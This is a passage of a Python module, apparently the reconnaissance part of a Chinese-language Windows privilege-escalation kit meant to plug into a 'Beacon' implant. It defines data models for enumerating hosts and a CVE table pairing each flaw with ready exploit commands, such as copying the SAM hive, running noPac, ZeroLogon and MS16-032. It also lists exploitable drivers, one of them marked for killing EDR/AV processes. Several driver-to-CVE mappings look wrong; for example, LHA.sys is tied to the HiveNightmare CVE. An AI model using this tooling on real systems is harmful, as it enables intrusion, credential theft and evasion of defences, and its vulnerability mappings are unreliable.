"""
Windows提权辅助套件 - 系统信息收集模块
========================================
纯Python实现，无外部工具依赖，直接集成到Beacon命令系统。

功能覆盖:
    1. 操作系统信息收集（版本/构建号/架构/安装日期/启动时间/VM检测）
    2. 用户与权限枚举（当前用户/SID/组/令牌权限/本地用户）
    3. 补丁与CVE漏洞对比（已安装补丁 vs 内置CVE知识库）
    4. 服务枚举（权限配置错误/未引号路径/可写二进制/漏洞驱动）
    5. 计划任务与自启动（SYSTEM任务/可写脚本/Run键/AlwaysInstallElevated/UAC）
    6. 文件系统与敏感文件（目录权限/可写系统路径/凭据配置文件）
    7. 网络与已安装软件（监听端口/端口转发/过时软件版本）

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import ctypes
import ctypes.wintypes
import json
import logging
import os
import platform
import re
import socket
import struct
import subprocess
import sys
import time
import winreg
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)

# =============================================================================
# Windows API 常量
# =============================================================================
TOKEN_QUERY = 0x0008
TOKEN_READ = 0x20008
TOKEN_DUPLICATE = 0x0002
TOKEN_ADJUST_PRIVILEGES = 0x0020
TokenElevation = 20
TokenPrivileges = 3
TokenGroups = 2
TokenUser = 1
TokenStatistics = 10

SECURITY_MANDATORY_LOW_RID = 0x00001000
SECURITY_MANDATORY_MEDIUM_RID = 0x00002000
SECURITY_MANDATORY_MEDIUM_PLUS_RID = 0x00002100
SECURITY_MANDATORY_HIGH_RID = 0x00003000
SECURITY_MANDATORY_SYSTEM_RID = 0x00004000

SC_MANAGER_ENUMERATE_SERVICE = 0x0004
SERVICE_QUERY_CONFIG = 0x0001
SERVICE_QUERY_STATUS = 0x0004
SERVICE_AUTO_START = 2
SERVICE_DEMAND_START = 3
SERVICE_DISABLED = 4
SERVICE_WIN32_OWN_PROCESS = 0x10
SERVICE_WIN32_SHARE_PROCESS = 0x20
SERVICE_KERNEL_DRIVER = 0x01

KEY_READ = 0x20019
KEY_WOW64_64KEY = 0x0100
KEY_WOW64_32KEY = 0x0200

SE_PRIVILEGE_ENABLED = 0x00000002

INTEGRITY_LEVEL_MAP: Dict[int, str] = {
    SECURITY_MANDATORY_LOW_RID: "Low",
    SECURITY_MANDATORY_MEDIUM_RID: "Medium",
    SECURITY_MANDATORY_MEDIUM_PLUS_RID: "Medium Plus",
    SECURITY_MANDATORY_HIGH_RID: "High",
    SECURITY_MANDATORY_SYSTEM_RID: "System",
}

PRIVESC_CRITICAL_PRIVILEGES: Set[str] = {
    "SeDebugPrivilege", "SeImpersonatePrivilege", "SeTakeOwnershipPrivilege",
    "SeBackupPrivilege", "SeRestorePrivilege", "SeLoadDriverPrivilege",
    "SeTcbPrivilege", "SeAssignPrimaryTokenPrivilege", "SeCreateTokenPrivilege",
}

KNOWN_PRIVILEGES: Dict[str, str] = {
    "SeCreateTokenPrivilege": "创建令牌对象",
    "SeAssignPrimaryTokenPrivilege": "替换进程级令牌",
    "SeLockMemoryPrivilege": "锁定内存页",
    "SeIncreaseQuotaPrivilege": "增加进程配额",
    "SeTcbPrivilege": "作为操作系统的一部分",
    "SeSecurityPrivilege": "管理审核和安全日志",
    "SeTakeOwnershipPrivilege": "取得文件或其他对象的所有权",
    "SeLoadDriverPrivilege": "加载和卸载设备驱动程序",
    "SeSystemProfilePrivilege": "配置文件系统性能",
    "SeSystemtimePrivilege": "更改系统时间",
    "SeProfileSingleProcessPrivilege": "配置文件单个进程",
    "SeIncreaseBasePriorityPrivilege": "提高计划优先级",
    "SeCreatePagefilePrivilege": "创建页面文件",
    "SeCreatePermanentPrivilege": "创建永久共享对象",
    "SeBackupPrivilege": "备份文件和目录",
    "SeRestorePrivilege": "还原文件和目录",
    "SeShutdownPrivilege": "关闭系统",
    "SeDebugPrivilege": "调试程序",
    "SeAuditPrivilege": "生成安全审核",
    "SeSystemEnvironmentPrivilege": "修改固件环境值",
    "SeChangeNotifyPrivilege": "绕过遍历检查",
    "SeRemoteShutdownPrivilege": "从远程系统强制关机",
    "SeUndockPrivilege": "从扩展坞上取下计算机",
    "SeSyncAgentPrivilege": "同步目录服务数据",
    "SeEnableDelegationPrivilege": "启用计算机和用户帐户以受信任的委派",
    "SeManageVolumePrivilege": "执行卷维护任务",
    "SeImpersonatePrivilege": "身份验证后模拟客户端",
    "SeCreateGlobalPrivilege": "创建全局对象",
    "SeTrustedCredManAccessPrivilege": "作为受信任的呼叫者访问凭据管理器",
    "SeRelabelPrivilege": "修改对象标签",
    "SeIncreaseWorkingSetPrivilege": "增加进程工作集",
    "SeTimeZonePrivilege": "更改时区",
    "SeCreateSymbolicLinkPrivilege": "创建符号链接",
    "SeDelegateSessionUserImpersonatePrivilege": "在身份验证后模拟其他用户",
}

SERVICE_START_TYPE_NAMES: Dict[int, str] = {
    0: "Boot", 1: "System", 2: "Auto", 3: "Manual", 4: "Disabled",
}

# =============================================================================
# 数据模型
# =============================================================================

@dataclass
class OSInfo:
    """操作系统信息"""
    os_name: str = ""
    version: str = ""
    build_number: str = ""
    edition: str = ""
    architecture: str = ""
    install_date: str = ""
    last_boot_time: str = ""
    is_virtual_machine: bool = False
    vm_type: str = ""
    vm_details: Dict[str, Any] = field(default_factory=dict)
    computer_name: str = ""
    domain: str = ""
    product_name: str = ""
    registered_owner: str = ""
    system_directory: str = ""
    windows_directory: str = ""
    locale: str = ""
    timezone: str = ""


@dataclass
class UserInfo:
    """用户与权限信息"""
    current_user: str = ""
    current_user_sid: str = ""
    current_user_domain: str = ""
    integrity_level: str = ""
    is_admin: bool = False
    is_system: bool = False
    is_elevated: bool = False
    local_groups: List[str] = field(default_factory=list)
    domain_groups: List[str] = field(default_factory=list)
    token_privileges: Dict[str, str] = field(default_factory=dict)
    critical_privileges: Dict[str, str] = field(default_factory=dict)
    local_users: List[Dict[str, Any]] = field(default_factory=list)
    local_administrators: List[str] = field(default_factory=list)
    uac_enabled: bool = True
    uac_level: int = 0


@dataclass
class PatchInfo:
    """补丁信息"""
    installed_patches: List[str] = field(default_factory=list)
    missing_patches: List[Dict[str, Any]] = field(default_factory=list)
    cve_findings: List[Dict[str, Any]] = field(default_factory=list)
    total_patches: int = 0


@dataclass
class ServiceInfo:
    """服务信息"""
    name: str = ""
    display_name: str = ""
    binary_path: str = ""
    start_type: str = ""
    start_name: str = ""
    state: str = ""
    is_unquoted_path: bool = False
    is_binary_writable: bool = False
    is_service_writable: bool = False
    risk_description: str = ""


@dataclass
class ServiceEnumResult:
    """服务枚举结果"""
    total_services: int = 0
    unquoted_path_services: List[ServiceInfo] = field(default_factory=list)
    writable_binary_services: List[ServiceInfo] = field(default_factory=list)
    misconfigured_services: List[ServiceInfo] = field(default_factory=list)
    vulnerable_drivers: List[Dict[str, Any]] = field(default_factory=list)
    third_party_drivers: List[str] = field(default_factory=list)


@dataclass
class ScheduledTaskInfo:
    """计划任务信息"""
    name: str = ""
    path: str = ""
    state: str = ""
    triggers: List[str] = field(default_factory=list)
    actions: List[str] = field(default_factory=list)
    principal: str = ""
    is_system_task: bool = False
    is_script_writable: bool = False
    risk_description: str = ""


@dataclass
class AutostartInfo:
    """自启动信息"""
    run_keys: List[Dict[str, str]] = field(default_factory=list)
    runonce_keys: List[Dict[str, str]] = field(default_factory=list)
    always_install_elevated: bool = False
    always_install_elevated_hklm: int = 0
    always_install_elevated_hkcu: int = 0
    uac_level: int = 0
    uac_enable_lua: int = 0
    uac_consent_prompt_behavior: int = 0
    startup_folder_items: List[str] = field(default_factory=list)
    scheduled_tasks: List[ScheduledTaskInfo] = field(default_factory=list)


@dataclass
class FileSystemInfo:
    """文件系统与敏感文件信息"""
    writable_system_paths: List[str] = field(default_factory=list)
    dll_hijack_candidates: List[str] = field(default_factory=list)
    credential_files_found: List[str] = field(default_factory=list)
    unattend_files: List[str] = field(default_factory=list)
    config_files_with_creds: List[str] = field(default_factory=list)


@dataclass
class NetworkInfo:
    """网络信息"""
    listening_tcp_ports: List[Dict[str, Any]] = field(default_factory=list)
    listening_udp_ports: List[Dict[str, Any]] = field(default_factory=list)
    port_forwarding_rules: List[Dict[str, Any]] = field(default_factory=list)
    network_interfaces: List[Dict[str, Any]] = field(default_factory=list)
    dns_servers: List[str] = field(default_factory=list)
    proxy_settings: Dict[str, str] = field(default_factory=dict)


@dataclass
class SoftwareInfo:
    """已安装软件信息"""
    installed_software: List[Dict[str, str]] = field(default_factory=list)
    outdated_software: List[Dict[str, Any]] = field(default_factory=list)
    total_installed: int = 0


@dataclass
class PrivescCollectionResult:
    """提权信息收集完整结果"""
    timestamp: str = ""
    hostname: str = ""
    os_info: OSInfo = field(default_factory=OSInfo)
    user_info: UserInfo = field(default_factory=UserInfo)
    patch_info: PatchInfo = field(default_factory=PatchInfo)
    service_info: ServiceEnumResult = field(default_factory=ServiceEnumResult)
    autostart_info: AutostartInfo = field(default_factory=AutostartInfo)
    filesystem_info: FileSystemInfo = field(default_factory=FileSystemInfo)
    network_info: NetworkInfo = field(default_factory=NetworkInfo)
    software_info: SoftwareInfo = field(default_factory=SoftwareInfo)
    collection_duration: float = 0.0
    errors: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """转换为JSON可序列化字典"""
        result: Dict[str, Any] = {
            "timestamp": self.timestamp,
            "hostname": self.hostname,
            "collection_duration": self.collection_duration,
            "errors": self.errors,
        }
        for field_name in [
            "os_info", "user_info", "patch_info", "service_info",
            "autostart_info", "filesystem_info", "network_info", "software_info",
        ]:
            value = getattr(self, field_name)
            if hasattr(value, '__dataclass_fields__'):
                result[field_name] = asdict(value)
            else:
                result[field_name] = str(value)
        return result

    def to_json(self, indent: int = 2) -> str:
        """转换为JSON字符串"""
        return json.dumps(self.to_dict(), ensure_ascii=False, indent=indent, default=str)


# =============================================================================
# CVE知识库 - 常见Windows提权漏洞
# =============================================================================

CVE_KNOWLEDGE_BASE: Dict[str, Dict[str, Any]] = {
    "CVE-2021-36934": {
        "title": "HiveNightmare (SeriousSAM)",
        "description": "非管理员用户可读取SAM/SECURITY/SYSTEM注册表文件获取本地用户哈希",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 1809-21H1", "Windows 11"],
        "patch_kb": ["KB5004945", "KB5004950", "KB5004953", "KB5004954",
                     "KB5004955", "KB5004956", "KB5004958", "KB5004959"],
        "exploit_method": "直接读取 %windir%\\system32\\config\\SAM 文件",
        "exploit_command": "copy C:\\Windows\\System32\\config\\SAM C:\\temp\\SAM",
        "expected_result": "获取所有本地用户NTLM哈希，可用于PtH攻击",
        "risk_note": "需要BUILTIN\\Users对config目录有读取权限（默认有）",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934",
        "risk_score": 85,
    },
    "CVE-2021-42287": {
        "title": "sAMAccountName Spoofing (NoPac)",
        "description": "AD域权限提升漏洞，允许标准域用户模拟域控制器",
        "severity": "Critical", "cvss": 8.8,
        "affected_versions": ["Windows Server 2008-2022", "Windows 7-11 (域成员)"],
        "patch_kb": ["KB5008102", "KB5008380", "KB5008601"],
        "exploit_method": "利用sam-the-admin或noPac工具修改机器账户sAMAccountName属性",
        "exploit_command": "python noPac.py domain/user:password -dc-ip DC_IP --impersonate administrator",
        "expected_result": "获取域管理员权限的TGT票据",
        "risk_note": "需要有效的域用户凭据和域控制器可达",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287",
        "risk_score": 90,
    },
    "CVE-2021-42278": {
        "title": "sAMAccountName Spoofing (companion)",
        "description": "CVE-2021-42287的配套漏洞，允许绕过安全描述符检查",
        "severity": "Critical", "cvss": 8.8,
        "affected_versions": ["Windows Server 2008-2022"],
        "patch_kb": ["KB5008102", "KB5008380"],
        "exploit_method": "与CVE-2021-42287配合使用",
        "exploit_command": "配合CVE-2021-42287使用noPac工具",
        "expected_result": "配合CVE-2021-42287实现域提权",
        "risk_note": "需要与CVE-2021-42287配合",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278",
        "risk_score": 90,
    },
    "CVE-2022-26923": {
        "title": "ADCS权限提升",
        "description": "ADCS证书服务权限提升，允许低权限用户获取域管理员证书",
        "severity": "Critical", "cvss": 8.8,
        "affected_versions": ["Windows Server 2008-2022 (安装了ADCS)"],
        "patch_kb": ["KB5014754"],
        "exploit_method": "利用Certipy工具请求基于用户模板的证书并获取域管理员TGT",
        "exploit_command": "certipy req -username user@domain -ca CA_NAME -template User",
        "expected_result": "获取域管理员证书和TGT",
        "risk_note": "需要ADCS服务存在且存在易受攻击的证书模板",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923",
        "risk_score": 85,
    },
    "CVE-2020-1472": {
        "title": "ZeroLogon",
        "description": "Netlogon协议特权提升漏洞，允许攻击者接管域控制器",
        "severity": "Critical", "cvss": 10.0,
        "affected_versions": ["Windows Server 2008 R2-2019"],
        "patch_kb": ["KB4565349", "KB4565351", "KB4565354", "KB4566782"],
        "exploit_method": "利用ZeroLogon POC重置域控制器机器账户密码为空",
        "exploit_command": "python zerologon.py DC_NETBIOS_NAME DC_IP",
        "expected_result": "重置域控制器机器账户密码，获取域管理员权限",
        "risk_note": "极具破坏性，会破坏域控制器通信，仅限授权测试",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472",
        "risk_score": 95,
    },
    "CVE-2019-1388": {
        "title": "Windows UAC绕过 (证书对话框)",
        "description": "通过Windows证书对话框中的浏览器链接绕过UAC",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 7-10 (pre-1903)", "Windows Server 2008 R2-2019"],
        "patch_kb": ["KB4525235", "KB4525236", "KB4525237"],
        "exploit_method": "右键以管理员运行hhupd.exe，在证书对话框中点击浏览器链接打开IE以SYSTEM权限运行",
        "exploit_command": "找到可执行文件的数字签名→属性→数字签名→详细信息→查看证书→点击颁发者链接→IE以SYSTEM打开→保存网页→打开cmd.exe",
        "expected_result": "以SYSTEM权限打开命令提示符",
        "risk_note": "需要GUI访问，UAC设置为默认级别",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1388",
        "risk_score": 75,
    },
    "MS16-032": {
        "title": "Secondary Logon Handle 权限提升",
        "description": "Secondary Logon服务中存在权限提升漏洞",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 7-10 (pre-1511)", "Windows Server 2008 R2-2012 R2"],
        "patch_kb": ["KB3139914", "KB3140410"],
        "exploit_method": "利用PowerShell Empire或MS16-032.ps1脚本",
        "exploit_command": "Invoke-MS16032 -Command 'cmd.exe'",
        "expected_result": "以SYSTEM权限执行命令",
        "risk_note": "需要Secondary Logon服务运行中",
        "reference": "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032",
        "risk_score": 80,
    },
    "MS16-135": {
        "title": "Win32k内核驱动权限提升",
        "description": "Win32k内核驱动中存在多个权限提升漏洞",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 7-10 (pre-1607)", "Windows Server 2008 R2-2016"],
        "patch_kb": ["KB3197868", "KB3197873", "KB3197874"],
        "exploit_method": "利用公开的PowerShell或C# EXP",
        "exploit_command": "利用公开EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-135",
        "risk_score": 80,
    },
    "MS17-010": {
        "title": "EternalBlue (SMBv1)",
        "description": "SMBv1远程代码执行漏洞，可用于本地提权（通过反射）",
        "severity": "Critical", "cvss": 9.8,
        "affected_versions": ["Windows 7-10 (pre-1703)", "Windows Server 2008 R2-2016"],
        "patch_kb": ["KB4012212", "KB4012213", "KB4012214", "KB4012215",
                     "KB4012216", "KB4012217", "KB4012598", "KB4012606"],
        "exploit_method": "利用EternalBlue进行本地反射攻击或远程攻击",
        "exploit_command": "利用MSF的exploit/windows/smb/ms17_010_psexec模块",
        "expected_result": "获取SYSTEM权限",
        "risk_note": "SMBv1必须启用，补丁未安装",
        "reference": "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010",
        "risk_score": 95,
    },
    "CVE-2021-1732": {
        "title": "Win32k权限提升",
        "description": "Win32k内核驱动中存在权限提升漏洞，已被APT组织广泛利用",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 1809-20H2", "Windows Server 2019-20H2"],
        "patch_kb": ["KB4601315", "KB4601319", "KB4601345"],
        "exploit_method": "利用公开的CVE-2021-1732 EXP",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1732",
        "risk_score": 85,
    },
    "CVE-2022-21882": {
        "title": "Win32k权限提升",
        "description": "Win32k内核驱动中存在权限提升漏洞",
        "severity": "High", "cvss": 7.0,
        "affected_versions": ["Windows 10 1809-21H2", "Windows 11", "Windows Server 2019-2022"],
        "patch_kb": ["KB5010791", "KB5010792", "KB5010793"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21882",
        "risk_score": 80,
    },
    "CVE-2023-21768": {
        "title": "AFD.sys权限提升",
        "description": "AFD.sys驱动中存在权限提升漏洞",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 20H2-22H2", "Windows 11 21H2-22H2", "Windows Server 2019-2022"],
        "patch_kb": ["KB5022282", "KB5022286", "KB5022287"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21768",
        "risk_score": 85,
    },
    "CVE-2023-28252": {
        "title": "CLFS.sys权限提升",
        "description": "CLFS.sys驱动中存在权限提升漏洞，已被Nokoyawa勒索软件利用",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 1607-22H2", "Windows 11 21H2-22H2", "Windows Server 2016-2022"],
        "patch_kb": ["KB5025221", "KB5025224", "KB5025228"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252",
        "risk_score": 85,
    },
    "CVE-2023-29336": {
        "title": "Win32k权限提升",
        "description": "Win32k内核驱动中存在权限提升漏洞",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 1607-22H2", "Windows 11 21H2-22H2", "Windows Server 2008-2022"],
        "patch_kb": ["KB5027215", "KB5027219", "KB5027222"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29336",
        "risk_score": 80,
    },
    "CVE-2023-36802": {
        "title": "MSKSSRV.sys权限提升",
        "description": "MSKSSRV.sys驱动中存在权限提升漏洞",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 1809-22H2", "Windows 11 21H2-22H2", "Windows Server 2019-2022"],
        "patch_kb": ["KB5029244", "KB5029247", "KB5029250"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36802",
        "risk_score": 80,
    },
    "CVE-2024-20698": {
        "title": "Windows Kernel权限提升",
        "description": "Windows内核中存在权限提升漏洞",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 1809-22H2", "Windows 11 21H2-23H2", "Windows Server 2019-2022"],
        "patch_kb": ["KB5034122", "KB5034123", "KB5034127"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20698",
        "risk_score": 80,
    },
    "CVE-2024-21338": {
        "title": "Windows Kernel权限提升 (AppLocker绕过)",
        "description": "Windows内核中存在权限提升漏洞，可绕过AppLocker",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 1809-22H2", "Windows 11 21H2-23H2", "Windows Server 2019-2022"],
        "patch_kb": ["KB5034763", "KB5034765", "KB5034768"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21338",
        "risk_score": 80,
    },
    "CVE-2024-26234": {
        "title": "Windows Proxy Driver欺骗漏洞",
        "description": "Windows代理驱动中存在权限提升漏洞",
        "severity": "High", "cvss": 6.7,
        "affected_versions": ["Windows 10 1809-22H2", "Windows 11 21H2-23H2", "Windows Server 2019-2022"],
        "patch_kb": ["KB5036892", "KB5036893", "KB5036896"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26234",
        "risk_score": 75,
    },
    "CVE-2024-30078": {
        "title": "Windows Wi-Fi Driver远程代码执行",
        "description": "Windows Wi-Fi驱动中存在远程代码执行漏洞，也可用于本地提权",
        "severity": "Critical", "cvss": 9.8,
        "affected_versions": ["Windows 10 1809-22H2", "Windows 11 21H2-23H2", "Windows Server 2019-2022"],
        "patch_kb": ["KB5039211", "KB5039212", "KB5039217"],
        "exploit_method": "利用公开EXP执行远程/本地代码执行",
        "exploit_command": "利用编译好的EXP执行代码",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要Wi-Fi适配器存在",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30078",
        "risk_score": 85,
    },
    "CVE-2024-38106": {
        "title": "Windows Kernel权限提升",
        "description": "Windows内核中存在竞争条件导致的权限提升漏洞",
        "severity": "High", "cvss": 7.0,
        "affected_versions": ["Windows 10 1809-22H2", "Windows 11 21H2-23H2", "Windows Server 2019-2022"],
        "patch_kb": ["KB5040427", "KB5040430", "KB5040434"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38106",
        "risk_score": 80,
    },
    "CVE-2024-49138": {
        "title": "CLFS.sys权限提升",
        "description": "CLFS.sys驱动中存在权限提升漏洞",
        "severity": "High", "cvss": 7.8,
        "affected_versions": ["Windows 10 1809-22H2", "Windows 11 21H2-24H2", "Windows Server 2019-2025"],
        "patch_kb": ["KB5048652", "KB5048654", "KB5048661"],
        "exploit_method": "利用公开EXP执行内核提权",
        "exploit_command": "利用编译好的EXP执行内核提权",
        "expected_result": "以SYSTEM权限执行代码",
        "risk_note": "需要本地交互式登录",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49138",
        "risk_score": 85,
    },
    "CVE-2025-21298": {
        "title": "Windows OLE远程代码执行",
        "description": "Windows OLE中存在远程代码执行漏洞，可通过恶意RTF/OLE对象触发",
        "severity": "Critical", "cvss": 9.8,
        "affected_versions": ["Windows 10 1809-22H2", "Windows 11 21H2-24H2", "Windows Server 2019-2025"],
        "patch_kb": ["KB5049981", "KB5049983", "KB5049984"],
        "exploit_method": "利用恶意RTF文档触发OLE漏洞",
        "exploit_command": "发送恶意RTF/OLE文档触发代码执行",
        "expected_result": "以当前用户权限执行代码，结合其他漏洞可提权",
        "risk_note": "需要用户交互（打开文档）",
        "reference": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21298",
        "risk_score": 75,
    },
}

# 已知漏洞驱动列表
VULNERABLE_DRIVERS: Dict[str, Dict[str, Any]] = {
    "Capcom.sys": {"cve": "N/A", "description": "Capcom反作弊驱动 - 允许任意内核代码执行",
                   "exploit": "利用ExploitCapcom或KDU加载驱动后执行内核级代码", "risk": 95},
    "WinRing0.sys": {"cve": "N/A", "description": "WinRing0硬件访问驱动 - 允许任意I/O端口读写",
                     "exploit": "通过I/O端口直接操作硬件/MSR寄存器实现提权", "risk": 90},
    "WinRing0x64.sys": {"cve": "N/A", "description": "WinRing0 x64版本",
                        "exploit": "同上，支持x64架构", "risk": 90},
    "RTCore64.sys": {"cve": "CVE-2019-16098", "description": "MSI Afterburner驱动 - 任意物理内存读写",
                     "exploit": "利用CVE-2019-16098通过物理内存读写实现内核提权", "risk": 95},
    "GVCIDrv64.sys": {"cve": "CVE-2021-31728", "description": "技嘉(Gigabyte)驱动 - 内核内存读写",
                      "exploit": "利用CVE-2021-31728通过内核内存读写实现提权", "risk": 90},
    "ene.sys": {"cve": "CVE-2020-15368", "description": "ENE Technology驱动 - 内核内存读写",
                "exploit": "利用CVE-2020-15368通过内核内存读写实现提权", "risk": 85},
    "AsrDrv101.sys": {"cve": "CVE-2021-32537", "description": "ASRock Polychrome RGB驱动 - 内核内存读写",
                      "exploit": "利用CVE-2021-32537实现内核级代码执行", "risk": 85},
    "AsrDrv102.sys": {"cve": "CVE-2021-32537", "description": "ASRock Polychrome RGB驱动v102",
                      "exploit": "同上", "risk": 85},
    "AsrDrv103.sys": {"cve": "CVE-2021-32537", "description": "ASRock Polychrome RGB驱动v103",
                      "exploit": "同上", "risk": 85},
    "AsIO3.sys": {"cve": "N/A", "description": "ASUS I/O驱动 - 允许任意I/O端口访问",
                  "exploit": "通过I/O端口操作实现内核级代码执行", "risk": 80},
    "AsUpIO.sys": {"cve": "N/A", "description": "ASUS更新I/O驱动 - 允许任意I/O端口访问",
                   "exploit": "通过I/O端口操作实现内核级代码执行", "risk": 80},
    "atillk64.sys": {"cve": "CVE-2020-12138", "description": "AMD ATI驱动 - 内核内存读写",
                     "exploit": "利用CVE-2020-12138实现内核级代码执行", "risk": 85},
    "BSMI.sys": {"cve": "CVE-2021-21551", "description": "Dell BIOS驱动 - 内核内存读写",
                 "exploit": "利用CVE-2021-21551实现内核提权", "risk": 90},
    "dbutil_2_3.sys": {"cve": "CVE-2021-21551", "description": "Dell DBUtil驱动 - 内核内存读写",
                       "exploit": "利用CVE-2021-21551实现内核级代码执行", "risk": 90},
    "HwOs2Ec10x64.sys": {"cve": "CVE-2022-22587", "description": "华为PCManager驱动 - 内核内存读写",
                         "exploit": "利用CVE-2022-22587实现内核级代码执行", "risk": 85},
    "HwOs2Ec64.sys": {"cve": "CVE-2022-22587", "description": "华为PCManager驱动",
                      "exploit": "同上", "risk": 85},
    "zamguard64.sys": {"cve": "CVE-2022-26938", "description": "Zemana AntiMalware驱动 - 内核内存读写",
                       "exploit": "利用CVE-2022-26938实现内核级代码执行", "risk": 85},
    "zam64.sys": {"cve": "CVE-2022-26938", "description": "Zemana AntiMalware驱动",
                  "exploit": "同上", "risk": 85},
    "gdrv.sys": {"cve": "CVE-2018-19320", "description": "技嘉APP Center驱动 - 内核内存读写",
                 "exploit": "利用CVE-2018-19320实现内核级代码执行", "risk": 85},
    "GDRV.sys": {"cve": "CVE-2018-19320", "description": "技嘉APP Center驱动",
                 "exploit": "同上", "risk": 85},
    "AODDriver2.sys": {"cve": "N/A", "description": "AMD OverDrive驱动 - 内核内存读写",
                       "exploit": "通过内核内存读写实现提权", "risk": 80},
    "AODDriver4.2.0.sys": {"cve": "N/A", "description": "AMD OverDrive驱动v4.2.0",
                           "exploit": "同上", "risk": 80},
    "ALSysIO64.sys": {"cve": "N/A", "description": "Core Temp驱动 - 允许任意I/O端口访问",
                      "exploit": "通过I/O端口操作实现内核级代码执行", "risk": 75},
    "kprocesshacker.sys": {"cve": "N/A", "description": "Process Hacker驱动 - 允许终止受保护进程",
                           "exploit": "可用于终止EDR/AV进程", "risk": 70},
    "MsIo64.sys": {"cve": "CVE-2021-42284", "description": "MSI Dragon Center驱动 - 内核内存读写",
                   "exploit": "利用CVE-2021-42284实现内核级代码执行", "risk": 85},
    "MsIo32.sys": {"cve": "CVE-2021-42284", "description": "MSI Dragon Center驱动(32位)",
                   "exploit": "同上", "risk": 85},
    "LHA.sys": {"cve": "CVE-2021-36934", "description": "Lenovo诊断驱动 - 内核内存读写",
                "exploit": "利用CVE-2021-36934实现内核级代码执行", "risk": 85},
    "NalDrv.sys": {"cve": "CVE-2021-42285", "description": "Intel网络适配器驱动 - 内核内存读写",
                   "exploit": "利用CVE-2021-42285实现内核级代码执行", "risk": 80},
    "iqvw64e.sys": {"cve": "CVE-2015-2291", "description": "Intel网络适配器诊断驱动 - 任意内核代码执行",
                    "exploit": "利用CVE-2015-2291实现内核级代码执行", "risk": 85},
    "Trufos.sys": {"cve": "CVE-2022-27510", "description": "Bitdefender Trufos驱动 - 内核内存读写",
                   "exploit": "利用CVE-2022-27510实现内核级代码执行", "risk": 85},
    "piddrv64.sys": {"cve": "CVE-2022-46344", "description": "HP Support Assistant驱动 - 内核内存读写",
                     "exploit": "利用CVE-2022-46344实现内核级代码执行", "risk": 85},
